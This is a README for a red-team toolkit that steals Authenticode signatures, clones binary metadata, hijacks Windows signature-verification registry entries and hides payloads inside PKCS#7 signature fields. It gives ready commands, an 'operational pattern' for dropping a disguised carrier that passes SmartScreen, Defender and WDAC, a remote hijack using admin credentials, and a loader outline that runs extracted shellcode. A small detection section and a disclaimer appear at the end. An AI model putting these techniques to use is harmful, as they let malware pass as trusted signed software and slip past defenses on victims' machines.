# TrustMeBro

**TrustMeBro** is a comprehensive Authenticode signature manipulation toolkit for Red Team operations and security research. It unifies signature stealing, metadata cloning, SIP hijacking, and **PKCS#7 payload embedding** into a single toolkit — available in both Python (cross-platform) and C++ (Windows native).

> **Note:** A rewritten Rust version is available at [TrustMeBro-Rust](https://github.com/KriyosArcane/TrustMeBro-Rust)

## Features

| Feature | Description | Python | C++ |
|---|---|:---:|:---:|
| **Signature Stealing** | Steal Authenticode cert table from a signed binary and graft it onto your payload | ✅ | ✅ |
| **Metadata Cloning** | Clone Version Info, Icon, and Manifest so Properties looks identical | ✅ | ✅ |
| **SIP Hijacking** | Redirect `CryptSIPDllVerifyIndirectData` to make stolen signatures validate as "Valid" | ✅ (remote) | ✅ (local) |
| **PKCS#7 Embed** | Embed arbitrary payload in `SignerInfo.unsignedAttrs` — signature stays valid | ✅ | ✅ |
| **Camouflage Mode** | Wrap payload as a fake `SPC_NESTED_SIGNATURE` — evades OID-anomaly scanners | ✅ | ✅ |

## Repository Structure

```
TrustMeBro/
├── TrustMeBro/                 # C++ native tool (Windows)
│   ├── main.cpp                #   Main entry point (steal, hijack, embed, extract)
│   ├── steal.h                 #   Signature stealing + metadata cloning + SIP hijack
│   ├── pkcs7_embed.h           #   Zero-dependency ASN.1 DER PKCS#7 embed/extract
│   └── TrustMeBro.inf          #   INF-based SIP hijack (right-click → Install)
├── SigStash/                   # Demo loader / extraction stub
│   └── loader.cpp              #   Extract + execute payload from carrier PE
├── bin/                        # Pre-compiled Windows binaries
│   ├── TrustMeBro.exe          #   Main tool
│   └── SigStashLoader.exe      #   Demo loader
├── TrustMeBro.py               # Python cross-platform tool
├── LICENSE
└── README.md
```

---

## How It Works

### SigFlip (CVE-2013-3900) — for comparison
<p align="center">
  <img src="docs/01-sigflip.svg" alt="SigFlip embeds payload in certificate table padding" width="700"/>
</p>

### SigStash — Direct Mode
<p align="center">
  <img src="docs/02-sigstash-direct.svg" alt="SigStash Direct embeds payload as an unsignedAttr inside the DER" width="700"/>
</p>

### SigStash — Camouflage Mode
<p align="center">
  <img src="docs/03-sigstash-camouflage.svg" alt="SigStash Camouflage wraps payload in a fake nested signature" width="700"/>
</p>

### Signature Stealing

Windows Authenticode signatures live in the `IMAGE_DIRECTORY_ENTRY_SECURITY` data directory. The tool reads the `WIN_CERTIFICATE` blob from a signed donor binary and appends it to your target, updating the PE header pointer.

### Metadata Cloning

Extracts the `.rsrc` section (icons, version info, manifest) from a donor and implants it into the target. Automatically fixes Resource Directory RVAs so icons render correctly. Uses `objcopy` on Linux, native `UpdateResource` APIs on Windows.

### SIP Hijacking

Windows uses Subject Interface Packages (SIPs) to verify signatures for different file types. By redirecting `CryptSIPDllVerifyIndirectData` to `ntdll!DbgUiContinue` (which always returns `TRUE`), stolen signatures validate as "Valid" without the hash actually matching.

| File Type | SIP GUID |
|---|---|
| PE (`.exe`, `.dll`, `.sys`) | `{C689AAB8-8E78-11D0-8C47-00C04FC295EE}` |
| PowerShell (`.ps1`) | `{603BCC1F-4B59-4E08-B724-D2C6297EF351}` |
| MSI (`.msi`) | `{000C10F1-0000-0000-C000-000000000046}` |

### PKCS#7 Payload Embedding (SigStash)

Embeds arbitrary data inside the PKCS#7 `SignerInfo.unsignedAttrs` field of an Authenticode-signed PE. Per [RFC 5652 §5.3](https://datatracker.ietf.org/doc/html/rfc5652#section-5.3), unauthenticated attributes are explicitly **not covered by the signer's signature**. The Authenticode hash and certificate chain remain untouched.

```
SignerInfo {
    ...
    signedAttrs     [0]  ← AUTHENTICATED (covered by signature)
    signature             ← RSA/ECDSA signature over signedAttrs
    unsignedAttrs   [1]  ← NOT SIGNED — we embed here
        ├── counterSignature (timestamp — if present)
        └── OUR PAYLOAD  ← arbitrary data, signature still valid
}
```

#### Why not SigFlip?

[SigFlip](https://github.com/med0x2e/SigFlip) (CVE-2013-3900) embeds data in **certificate table padding** — raw bytes between the end of the PKCS#7 DER blob and the `WIN_CERTIFICATE.dwLength` boundary. This is killed by `EnableCertPaddingCheck`.

Our technique embeds data **inside** the PKCS#7 DER structure as a properly-formed ASN.1 attribute. It is not padding. It is not malformed. It is a valid CMS attribute per RFC 5652.

| Property | SigFlip | TrustMeBro (SigStash) |
|---|---|---|
| Location | After PKCS#7 DER (padding) | Inside PKCS#7 DER (unsignedAttrs) |
| ASN.1 valid | ❌ (raw bytes) | ✅ (proper `SEQUENCE{OID, SET{OCTET STRING}}`) |
| `EnableCertPaddingCheck` | ❌ Killed | ✅ No effect |
| Capacity | ~tens of KB | Tested 16MB+ |
| Detection surface | Cert padding scanners | None standard |

#### Camouflage Mode

By default, the payload uses OID `1.3.6.1.4.1.311.99.1` — a custom OID that any anomaly scanner could flag.

**Camouflage mode** (`--camouflage`) wraps the payload inside a fake `SPC_NESTED_SIGNATURE` (`1.3.6.1.4.1.311.2.4.1`) — the **same OID** that `signtool sign /as` uses for dual-signed PEs. The wrapper is a structurally valid `ContentInfo(SignedData)` with empty signerInfos:

```
unsignedAttrs {
    SPC_NESTED_SIGNATURE (1.3.6.1.4.1.311.2.4.1)   ← known Microsoft OID
    └── ContentInfo {
            └── SignedData {                          ← looks like a nested signature
                    version: v1
                    digestAlgorithms: { sha256 }
                    encapContentInfo.content: <PAYLOAD>  ← hidden here
                    certificates: []
                    signerInfos: []
                }
        }
}
```

This defeats OID-anomaly scanners because the OID is a **known, expected** Microsoft attribute. `signtool verify /pa` ignores nested signatures entirely. No warning, no error.

#### Verification Results

After embedding, the Authenticode signature remains valid:
```
signtool verify /pa /v output.exe
  → Successfully verified
  → Hash unchanged, chain unchanged, timestamp unchanged
```

---

## Usage

### C++ Version (Windows Native)

**Signature Stealing + Hijacking:**
```cmd
:: All-in-one: steal signature, clone metadata, hijack registry
TrustMeBro.exe C:\Windows\explorer.exe agent.exe --clone

:: Steal only (no registry hijack)
TrustMeBro.exe C:\Windows\explorer.exe agent.exe --no-hijack

:: Steal + Clone Metadata only
TrustMeBro.exe C:\Windows\explorer.exe agent.exe --clone --no-hijack

:: Restore registry to default
TrustMeBro.exe --clean
```

**PKCS#7 Payload Embedding:**
```cmd
:: Embed payload into a signed PE
TrustMeBro.exe --embed payload.bin signed.exe output.exe

:: Extract payload
TrustMeBro.exe --extract recovered.bin output.exe

:: Camouflage mode (SPC_NESTED_SIGNATURE)
TrustMeBro.exe --embed payload.bin signed.exe output.exe --camouflage
TrustMeBro.exe --extract recovered.bin output.exe --camouflage

:: Custom OID
TrustMeBro.exe --embed payload.bin signed.exe output.exe --oid 1.3.6.1.4.1.55555.1.1
```

---

### Python Version (Cross-Platform)

**Requirements:** Python 3.10+, `asn1crypto` (for embed/extract), `objcopy` (for metadata cloning)

```bash
pip install asn1crypto    # only needed for embed/extract
```

**Signature Stealing:**
```bash
# Steal signature
python3 TrustMeBro.py steal -s explorer.exe -t agent.exe

# Steal + Clone Metadata
python3 TrustMeBro.py steal -s explorer.exe -t agent.exe --clone
```

**SIP Hijacking (Remote Registry via Impacket):**
```bash
# Hijack
python3 TrustMeBro.py hijack 192.168.1.10 -u Administrator -p Password123

# Restore
python3 TrustMeBro.py hijack 192.168.1.10 -u Administrator -p Password123 --action clean
```

**PKCS#7 Payload Embedding:**
```bash
# Embed
python3 TrustMeBro.py embed -s signed.exe -p payload.bin -o output.exe

# Extract
python3 TrustMeBro.py extract -s output.exe -o recovered.bin

# Camouflage mode
python3 TrustMeBro.py embed -s signed.exe -p payload.bin -o output.exe --camouflage
python3 TrustMeBro.py extract -s output.exe -o recovered.bin --camouflage

# Custom OID
python3 TrustMeBro.py embed -s signed.exe -p payload.bin -o output.exe --oid 1.3.6.1.4.1.55555.1.1
```

---

### SigStash Loader (Demo)

The `SigStash/loader.cpp` is a demo extraction stub that reads a carrier PE and extracts the embedded payload. Use it as a reference for building your own loader.

```cmd
:: Extract and display payload
SigStashLoader.exe carrier.exe

:: Extract from camouflage mode
SigStashLoader.exe carrier.exe --camouflage

:: Self-extract (loader reads its own PE)
SigStashLoader.exe SigStashLoader.exe

:: Extract and execute as shellcode (Windows only)
SigStashLoader.exe carrier.exe --exec
```

**Operational pattern:**
```
1. Pick a legitimately signed PE from the target (e.g., C:\Windows\System32\mspaint.exe)
2. Embed your payload:
     TrustMeBro.exe --embed shellcode.bin mspaint.exe carrier.exe --camouflage
3. Drop carrier.exe on target (passes SmartScreen, Defender, signature checks)
4. Your loader extracts the payload from carrier.exe's signature and executes it
5. No unsigned files on disk. No separate payload file. No download needed.
```

**Building a custom loader:**

The key function is just TLV walking — find the OID in `unsignedAttrs`, grab the `OCTET STRING` content. Here's the minimal pattern in C:

```c
// Minimal self-extracting loader (conceptual — see loader.cpp for full implementation)
#include <windows.h>
#include <stdio.h>

// 1. Read your own PE: GetModuleFileName + ReadFile
// 2. Find WIN_CERTIFICATE via DataDirectory[4] (file offset, NOT RVA)
// 3. Skip 8-byte WIN_CERTIFICATE header to get PKCS#7 DER
// 4. Walk ASN.1 TLVs: ContentInfo → SignedData → signerInfos[0] → unsignedAttrs
// 5. Match your OID, read the SET → OCTET STRING content
// 6. VirtualAlloc(RWX) + memcpy + CreateThread

// See SigStash/loader.cpp for the complete working implementation
```

For camouflage mode, add one more layer: after finding the `SPC_NESTED_SIGNATURE` attribute, parse the inner `ContentInfo → SignedData → encapContentInfo.content` to get the actual payload.

---

### INF-based SIP Hijack (One-Click)

For quick local hijacking without running the EXE:
```cmd
:: Right-click TrustMeBro.inf → Install
:: Or from command line:
rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\TrustMeBro\TrustMeBro.inf
```

---

## Building from Source

**C++ (Windows cross-compile from Linux):**
```bash
# TrustMeBro main tool
x86_64-w64-mingw32-g++ -std=c++17 -O2 -o bin/TrustMeBro.exe TrustMeBro/main.cpp -lshlwapi

# SigStash loader
x86_64-w64-mingw32-g++ -std=c++17 -O2 -o bin/SigStashLoader.exe SigStash/loader.cpp
```

**C++ (Visual Studio on Windows):**
```cmd
cl /std:c++17 /O2 /Fe:TrustMeBro.exe TrustMeBro\main.cpp shlwapi.lib
cl /std:c++17 /O2 /Fe:SigStashLoader.exe SigStash\loader.cpp
```

No external dependencies. The `pkcs7_embed.h` header is a self-contained, zero-dependency ASN.1 DER parser/encoder (~330 lines).

---

## Detection Analysis

### What does NOT detect PKCS#7 embedding

| Method | Result | Why |
|---|---|---|
| `signtool verify /pa` | ✅ PASS | Unauthenticated attrs not checked |
| `WinVerifyTrust` | ✅ PASS | Same verification logic |
| Windows SmartScreen | ✅ PASS | Trusts WinVerifyTrust |
| Defender static scan | No alert | Payload inside PKCS#7 structure |
| Sysmon Event ID 7 | No event | Signature appears valid |
| `EnableCertPaddingCheck` | No effect | Payload is inside DER, not padding |
| WDAC / AppLocker | ✅ PASS | Signature and hash unchanged |

### What CAN detect it

| Method | How |
|---|---|
| Custom YARA rule | Flag PEs with unusually large `WIN_CERTIFICATE` |
| ASN.1 deep inspection | Parse PKCS#7, flag unknown OIDs in unsignedAttrs |
| OID allowlist | Only permit `1.3.6.1.4.1.311.3.3.1` (timestamp) in unsignedAttrs |
| File entropy analysis | Encrypted payloads raise entropy in the cert region |

> **Note:** Camouflage mode (`--camouflage`) defeats the OID-based detections above because `1.3.6.1.4.1.311.2.4.1` is a known, expected Microsoft OID.

---

## Disclaimer

This tool is intended for educational purposes and authorized security testing only. Misuse of this tool to attack systems without consent is illegal. The authors are not responsible for any damage caused by this software.

## Credits & Inspirations

*   **[SigFlip](https://github.com/med0x2e/SigFlip)** by med0x2e — Pioneered the concept of embedding payloads in Authenticode signatures via certificate table padding (CVE-2013-3900). Our PKCS#7 approach was directly inspired by SigFlip's work.
*   **[SignatureKid](https://github.com/dslee2022/SignatureKid)** by David Lee — Research on signature manipulation and the original code that the signature stealing component is based on.
*   **[MetaTwin](https://github.com/threatexpress/metatwin)** by ThreatExpress — For the concept of cloning binary metadata.
